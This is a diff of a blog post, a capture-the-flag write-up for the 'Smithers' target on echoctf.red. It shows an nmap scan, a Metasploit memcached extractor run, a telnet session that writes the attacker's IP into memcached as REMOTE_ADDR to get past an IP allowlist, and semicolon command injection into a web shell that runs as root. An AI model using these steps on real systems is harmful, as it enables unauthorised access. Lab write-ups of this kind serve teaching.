@@ -4,13 +4,18 @@ title:  "Smithers"
 date:   2024-07-18 17:42:56 +0200
 categories: ctf
 ---
-<img width="56" height="106" src=":/ac8affd60a4543bc9ad9e5cdbb10d960"/>
+![Smithers](/assets/_smithers_0f5264ff08434e25b0eec8db30373c63.png)
 
 [Link to target](https://echoctf.red/target/5)
 
-So this is Smithers on echoctf.red:
+## Introduction
+This post details the process of solving the "Smithers" challenge on echoctf.red.
 
-I start reconing with nmap:
+## Enumeration Phase
+
+### Nmap Scan
+I start the reconnaissance with nmap:
+
 ```
 PORT      STATE SERVICE   VERSION
 10888/tcp open  http      nginx
@@ -20,12 +25,14 @@ PORT      STATE SERVICE   VERSION
 11211/tcp open  memcached Memcached 1.5.12 (uptime 224 seconds)
 ```
 
-on port 10888 there's a web server:
-![2137b8041b3930623610e38508ecd760.png](:/5b0d8a3da2914f4484de33d25c7755c5)
+### Web Server on Port 10888
+There is a web server running on port 10888:
+![Webserver](/assets/webserver.png)
 
-It says that these utilities are only available to authorized IP's only.
+It mentions that these utilities are only available to authorized IP addresses.
 
-I use metasploit to extract infos from memcached:
+### Extracting Information from Memcached with Metasploit
+I use Metasploit to extract information from the memcached service:
 
 ```
 msf6 > use auxiliary/gather/memcached_extractor
@@ -45,9 +52,12 @@ Keys/Values Found for 10.0.100.142:11211
 
 ```
 
-and a flag is found.
+A flag is found in the memcached service.
 
-We start the exploitation phase. The key is to store my IP address in the memcached service as REMOTE_ADDR so after i searched online i use telnet to connect and to store my address
+## Exploitation Phase
+
+### Using Telnet to Modify Memcached
+The key is to store my IP address in the memcached service as `REMOTE_ADDR`. After some research, I use telnet to connect and store my IP address:
 
 ```
 telnet 10.0.100.142 11211
@@ -59,10 +69,15 @@ add REMOTE_ADDR 0 0 10
 STORED
 ```
 
-Once my address is stored, i can access the web server, it presents a command line.
-![6d86c92ad14f58d3009dcc8713a3e05c.png](:/43dba091bef24c81a6e1823551be81ce)
-Two flags are there. Using ";" I can run other commands and see that it runs as root. So with a simple ```
+
+### Accessing the Web Server
+Once my address is stored, I can access the web server, which presents a command line interface:
+![Webserver After](/assets/webserver_after.png)
+
+Two flags are visible. Using a semicolon (`;`), I can run other commands and see that it runs as root. By executing:
+
+```
 grep -r 'ETSCTF' /
 ``` 
 
-I can find all flags.
+All flags are found.
